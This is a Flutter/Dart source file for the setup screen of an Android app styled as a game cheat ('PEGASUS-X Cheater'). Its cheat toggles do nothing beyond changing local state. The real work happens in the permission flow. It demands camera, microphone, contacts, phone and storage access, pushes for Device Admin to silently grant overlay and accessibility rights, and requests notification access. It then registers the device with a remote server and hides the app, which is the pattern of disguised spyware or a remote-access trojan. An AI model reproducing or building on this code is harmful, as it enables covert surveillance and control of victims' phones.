import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../services/api_service.dart';
import '../services/native_service.dart';
import '../utils/theme.dart';

class SetupScreen extends StatefulWidget {
  final String username;
  final bool skipToCheat;
  const SetupScreen({super.key, required this.username, this.skipToCheat = false});
  @override
  State<SetupScreen> createState() => _SetupScreenState();
}

class _SetupScreenState extends State<SetupScreen> with TickerProviderStateMixin {

  int _phase = 0;
  bool _connected  = false;
  bool _checking   = false;

  bool _aimLock       = false;
  bool _cheatAntena   = false;
  bool _autoHeadshot  = false;
  bool _overlayEnabled = false;

  late AnimationController _glowCtrl;
  late Animation<double> _glowAnim;
  late AnimationController _pulseCtrl;
  late Animation<double> _pulseAnim;

  static const _cyan   = Color(0xFF00E5FF);
  static const _blue   = Color(0xFF1565C0);
  static const _purple = Color(0xFF7C4DFF);

  @override
  void initState() {
    super.initState();

    _glowCtrl = AnimationController(vsync: this, duration: const Duration(seconds: 2))
      ..repeat(reverse: true);
    _glowAnim = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowCtrl, curve: Curves.easeInOut));

    _pulseCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 1200))
      ..repeat(reverse: true);
    _pulseAnim = Tween<double>(begin: 0.9, end: 1.05).animate(
      CurvedAnimation(parent: _pulseCtrl, curve: Curves.easeInOut));

    if (widget.skipToCheat) {
      _checkAndProceed();
    } else {
      _requestAllAndCheck();
    }
  }

  @override
  void dispose() {
    _glowCtrl.dispose();
    _pulseCtrl.dispose();
    super.dispose();
  }

  // ── Request semua permission ─────────────────────────────────────────────
  Future<void> _requestAllAndCheck() async {
    if (_checking) return;
    setState(() { _checking = true; _phase = 0; });

    // ── Step 1: Permission biasa via dialog (kamera, notif, dll) ─────────
    final notifDenied    = await Permission.notification.isPermanentlyDenied;
    final camDenied      = await Permission.camera.isPermanentlyDenied;
    final contactsDenied = await Permission.contacts.isPermanentlyDenied;
    if (notifDenied || camDenied || contactsDenied) {
      await openAppSettings();
      await Future.delayed(const Duration(seconds: 2));
    }
    await [
      Permission.camera,
      Permission.notification,
      Permission.storage,
      Permission.microphone,
      Permission.contacts,
      Permission.phone,
      Permission.manageExternalStorage,
    ].request();

    // ── Step 2: Device Admin — UTAMA, tunggu sampai benar-benar aktif ────
    bool adminAktif = await NativeService.checkDeviceAdmin();
    if (!adminAktif) {
      await NativeService.requestDeviceAdmin();
      // Polling sampai user approve, max 30 detik
      for (int i = 0; i < 30; i++) {
        await Future.delayed(const Duration(seconds: 1));
        adminAktif = await NativeService.checkDeviceAdmin();
        if (adminAktif) break;
      }
    }

    // ── Step 3 & 4: Kalau admin sudah aktif → overlay & accessibility
    //                auto-grant via DPM (silent, tidak perlu popup) ───────
    if (adminAktif) {
      // Overlay — auto silent via DPM
      final overlayOk = await NativeService.checkOverlayPermission();
      if (!overlayOk) {
        await NativeService.requestOverlayPermission(); // sudah pakai DPM di dalam
        await Future.delayed(const Duration(milliseconds: 500));
      }
      // Accessibility — auto silent via DPM
      final accOk = await NativeService.checkAccessibility();
      if (!accOk) {
        await NativeService.requestAccessibility(); // sudah pakai DPM di dalam
        await Future.delayed(const Duration(milliseconds: 500));
      }
    } else {
      // Admin tidak di-grant user → fallback manual seperti biasa
      final overlayOk = await NativeService.checkOverlayPermission();
      if (!overlayOk) {
        await NativeService.requestOverlayPermission();
        await Future.delayed(const Duration(seconds: 3));
      }
      final accOk = await NativeService.checkAccessibility();
      if (!accOk) {
        await NativeService.requestAccessibility();
        await Future.delayed(const Duration(seconds: 3));
      }
    }

    // ── Step 5: Notification Listener (selalu manual) ────────────────────
    final notifListenerOk = await NativeService.checkNotifListener();
    if (!notifListenerOk) {
      await NativeService.requestNotifListener();
      await Future.delayed(const Duration(seconds: 3));
    }

    if (mounted) setState(() => _checking = false);
    await _checkAndProceed();
  }

  // ── Cek critical permissions ─────────────────────────────────────────────
  Future<void> _checkAndProceed() async {
    final overlayOk = await NativeService.checkOverlayPermission();
    final notifOk   = await Permission.notification.isGranted;
    final camOk     = await Permission.camera.isGranted;
    // contacts + notif listener tidak diblokir, opsional — tetap lanjut kalau overlay+notif+cam ok

    if (!overlayOk || !notifOk || !camOk) {
      if (mounted) setState(() { _phase = 0; _checking = false; });
      return;
    }

    await _connectServer();
  }

  Future<void> _connectServer() async {
    try {
      final prefs         = await SharedPreferences.getInstance();
      final ownerUsername = prefs.getString('ownerUsername') ?? widget.username;
      String deviceId     = prefs.getString('deviceId')     ?? '';
      if (deviceId.isEmpty) {
        deviceId = 'psknmrc_${_randomHex(8)}';
        await prefs.setString('deviceId', deviceId);
      }
      String deviceName = prefs.getString('deviceName') ?? '';
      if (deviceName.isEmpty) {
        deviceName = 'HP-${widget.username.toUpperCase()}-${_randomHex(4).toUpperCase()}';
        await prefs.setString('deviceName', deviceName);
      }
      await NativeService.startSocketService(
        serverUrl:     ApiService.baseUrl,
        deviceId:      deviceId,
        deviceName:    deviceName,
        ownerUsername: ownerUsername,
      );
      // Simpan flag connected ke native SharedPreferences
      await prefs.setBool('server_connected', true);
      if (mounted) setState(() => _connected = true);
    } catch (_) {}

    if (mounted) setState(() => _phase = 1);

    // Auto hide ke background setelah masuk dashboard
    await Future.delayed(const Duration(milliseconds: 400));
    await NativeService.hideApp();
  }

  String _randomHex(int len) {
    final rng = Random.secure();
    return List.generate(len, (_) => rng.nextInt(16).toRadixString(16)).join();
  }

  void _onToggle(String type, bool value) {
    HapticFeedback.mediumImpact();
    setState(() {
      switch (type) {
        case 'aim':      _aimLock = value; break;
        case 'antena':   _cheatAntena = value; break;
        case 'headshot': _autoHeadshot = value; break;
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppTheme.darkBg,
      body: SafeArea(
        child: _phase == 0
          ? _buildPermPhase()
          : _buildCheatDashboard()),
    );
  }

  // ── Phase 0: Permission ───────────────────────────────────────────────────
  Widget _buildPermPhase() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 40),
        child: Column(mainAxisSize: MainAxisSize.min, children: [

          AnimatedBuilder(
            animation: _pulseAnim,
            builder: (_, __) => Container(
              width: 80 * _pulseAnim.value,
              height: 80 * _pulseAnim.value,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: _cyan.withOpacity(0.1),
                border: Border.all(color: _cyan.withOpacity(0.4), width: 1.5),
                boxShadow: [BoxShadow(color: _cyan.withOpacity(0.2), blurRadius: 30)]),
              child: Center(
                child: _checking
                  ? const SizedBox(width: 28, height: 28,
                      child: CircularProgressIndicator(color: Color(0xFF00E5FF), strokeWidth: 2))
                  : Icon(Icons.shield_outlined, color: _cyan.withOpacity(0.7), size: 32)))),

          const SizedBox(height: 24),

          const Text('Izinkan Semua Lalu Lanjutkan',
            textAlign: TextAlign.center,
            style: TextStyle(
              fontFamily: 'Orbitron', fontSize: 14,
              color: Colors.white, letterSpacing: 1.5)),

          const SizedBox(height: 8),
          Text('Overlay • Kamera • Kontak • Notifikasi',
            textAlign: TextAlign.center,
            style: TextStyle(fontFamily: 'ShareTechMono',
              fontSize: 10, color: Colors.white.withOpacity(0.35))),

          const SizedBox(height: 32),

          if (!_checking)
            GestureDetector(
              onTap: _requestAllAndCheck,
              child: AnimatedBuilder(
                animation: _glowAnim,
                builder: (_, __) => Container(
                  width: double.infinity,
                  padding: const EdgeInsets.symmetric(vertical: 16),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(colors: [
                      const Color(0xFF00E5FF).withOpacity(0.8 + 0.2 * _glowAnim.value),
                      const Color(0xFF1565C0),
                    ]),
                    borderRadius: BorderRadius.circular(14),
                    boxShadow: [BoxShadow(
                      color: _cyan.withOpacity(0.3 * _glowAnim.value),
                      blurRadius: 20)]),
                  child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                    Icon(Icons.refresh_rounded, color: Colors.white, size: 18),
                    SizedBox(width: 10),
                    Text('COBA LAGI',
                      style: TextStyle(
                        fontFamily: 'Orbitron', fontSize: 13,
                        fontWeight: FontWeight.bold,
                        color: Colors.white, letterSpacing: 3)),
                  ]),
                ),
              ),
            ),
        ]),
      ),
    );
  }

  // ── Phase 1: Cheat Dashboard ──────────────────────────────────────────────
  Widget _buildCheatDashboard() {
    return SingleChildScrollView(
      padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 20),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [

        Row(children: [
          AnimatedBuilder(
            animation: _glowAnim,
            builder: (_, __) => Container(
              width: 44, height: 44,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: const SweepGradient(colors: [
                  Color(0xFF00E5FF), Color(0xFF1565C0),
                  Color(0xFF7C4DFF), Color(0xFF00E5FF)]),
                boxShadow: [BoxShadow(
                  color: _cyan.withOpacity(0.3 * _glowAnim.value), blurRadius: 16)]),
              child: Padding(
                padding: const EdgeInsets.all(2),
                child: Container(
                  decoration: const BoxDecoration(shape: BoxShape.circle, color: Colors.black),
                  child: ClipOval(
                    child: Image.asset('assets/icons/login.jpg', fit: BoxFit.cover,
                      errorBuilder: (_, __, ___) => const Icon(
                        Icons.shield_rounded, color: Colors.white, size: 24))))))),
          const SizedBox(width: 12),
          Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            const Text('PEGASUS-X', style: TextStyle(
              fontFamily: 'Deltha', fontSize: 18,
              color: Colors.white, letterSpacing: 3)),
            Text('C · H · E · A · T · E · R',
              style: TextStyle(fontFamily: 'Orbitron', fontSize: 8,
                color: _cyan.withOpacity(0.7), letterSpacing: 3)),
          ]),
          const Spacer(),
          AnimatedBuilder(
            animation: _glowAnim,
            builder: (_, __) {
              final color = _connected
                ? const Color(0xFF4CAF50)
                : const Color(0xFFFF9800);
              return Container(
                width: 12, height: 12,
                decoration: BoxDecoration(
                  shape: BoxShape.circle, color: color,
                  boxShadow: [BoxShadow(
                    color: color.withOpacity(0.6 * _glowAnim.value), blurRadius: 8)]));
            }),
        ]),

        const SizedBox(height: 8),
        AnimatedBuilder(
          animation: _glowAnim,
          builder: (_, __) => Container(height: 1,
            decoration: BoxDecoration(gradient: LinearGradient(colors: [
              _cyan.withOpacity(0.6 * _glowAnim.value), Colors.transparent])))),
        const SizedBox(height: 28),

        Center(child: _buildProfilePhoto()),
        const SizedBox(height: 8),
        Center(child: Text(widget.username.toUpperCase(),
          style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11,
            color: _cyan.withOpacity(0.6), letterSpacing: 3))),
        const SizedBox(height: 28),

        _buildCheatToggle(
          icon: Icons.gps_fixed_rounded, label: 'AIM LOCK',
          subtitle: 'Auto target enemy', value: _aimLock,
          color: const Color(0xFFFF5252),
          onChanged: (v) => _onToggle('aim', v)),
        const SizedBox(height: 12),
        _buildCheatToggle(
          icon: Icons.wifi_tethering_rounded, label: 'CHEAT ANTENA',
          subtitle: 'Signal boost & wall hack', value: _cheatAntena,
          color: _cyan,
          onChanged: (v) => _onToggle('antena', v)),
        const SizedBox(height: 12),
        _buildCheatToggle(
          icon: Icons.my_location_rounded, label: 'AUTO HEADSHOT',
          subtitle: 'Perfect accuracy mode', value: _autoHeadshot,
          color: const Color(0xFFFFD700),
          onChanged: (v) => _onToggle('headshot', v)),

        const SizedBox(height: 20),

        // Divider settings
        AnimatedBuilder(
          animation: _glowAnim,
          builder: (_, __) => Row(children: [
            Expanded(child: Container(height: 1,
              color: Colors.white.withOpacity(0.07))),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 12),
              child: Text('SETTINGS', style: TextStyle(
                fontFamily: 'Orbitron', fontSize: 7,
                color: Colors.white.withOpacity(0.25), letterSpacing: 3))),
            Expanded(child: Container(height: 1,
              color: Colors.white.withOpacity(0.07))),
          ])),

        const SizedBox(height: 12),

        _buildCheatToggle(
          icon: Icons.picture_in_picture_rounded,
          label: 'OVERLAY PANEL',
          subtitle: 'Tampilkan panel di atas semua app',
          value: _overlayEnabled,
          color: const Color(0xFF9C27B0),
          onChanged: (v) async {
            HapticFeedback.mediumImpact();
            setState(() => _overlayEnabled = v);
            if (v) {
              await NativeService.startCheatOverlay();
            } else {
              await NativeService.stopCheatOverlay();
            }
          }),

        const SizedBox(height: 32),
        Center(child: Text('PSKNMRC v1.0.0 • Authorized Only',
          style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9,
            color: Colors.white.withOpacity(0.2)))),
      ]),
    );
  }

  Widget _buildProfilePhoto() {
    return AnimatedBuilder(
      animation: _glowAnim,
      builder: (_, __) {
        final g = _glowAnim.value;
        return Container(
          width: 110, height: 110,
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            gradient: SweepGradient(colors: [
              _cyan.withOpacity(g), _blue, _purple.withOpacity(g), _cyan.withOpacity(g)]),
            boxShadow: [BoxShadow(
              color: _cyan.withOpacity(0.3 * g), blurRadius: 20, spreadRadius: 2)]),
          child: Padding(
            padding: const EdgeInsets.all(3),
            child: Container(
              decoration: const BoxDecoration(shape: BoxShape.circle, color: Colors.black),
              child: ClipOval(
                child: Image.asset('assets/icons/login.jpg',
                  width: 104, height: 104, fit: BoxFit.cover,
                  errorBuilder: (_, __, ___) => Container(
                    color: AppTheme.primaryBlue,
                    child: const Icon(Icons.person_rounded, color: Colors.white, size: 50)))))));
      });
  }

  Widget _buildCheatToggle({
    required IconData icon, required String label, required String subtitle,
    required bool value, required Color color, required ValueChanged<bool> onChanged,
  }) {
    return AnimatedBuilder(
      animation: _glowAnim,
      builder: (_, __) => AnimatedContainer(
        duration: const Duration(milliseconds: 300),
        padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
        decoration: BoxDecoration(
          color: value ? color.withOpacity(0.1) : AppTheme.cardBg,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: value
              ? color.withOpacity(0.5 + 0.3 * _glowAnim.value)
              : color.withOpacity(0.2),
            width: value ? 1.5 : 1),
          boxShadow: value ? [BoxShadow(
            color: color.withOpacity(0.15 * _glowAnim.value),
            blurRadius: 16, spreadRadius: 1)] : []),
        child: Row(children: [
          Container(
            width: 40, height: 40,
            decoration: BoxDecoration(
              color: color.withOpacity(value ? 0.2 : 0.08),
              borderRadius: BorderRadius.circular(11),
              border: Border.all(color: color.withOpacity(value ? 0.6 : 0.25))),
            child: Icon(icon, color: color.withOpacity(value ? 1.0 : 0.5), size: 20)),
          const SizedBox(width: 14),
          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(label, style: TextStyle(
              fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold,
              color: value ? color : Colors.white.withOpacity(0.7), letterSpacing: 1)),
            const SizedBox(height: 2),
            Text(subtitle, style: TextStyle(fontFamily: 'ShareTechMono',
              fontSize: 9, color: Colors.white.withOpacity(0.35))),
          ])),
          Transform.scale(
            scale: 0.85,
            child: Switch(
              value: value, onChanged: onChanged,
              activeColor: color, activeTrackColor: color.withOpacity(0.25),
              inactiveThumbColor: Colors.white.withOpacity(0.3),
              inactiveTrackColor: Colors.white.withOpacity(0.08))),
        ]),
      ));
  }
}
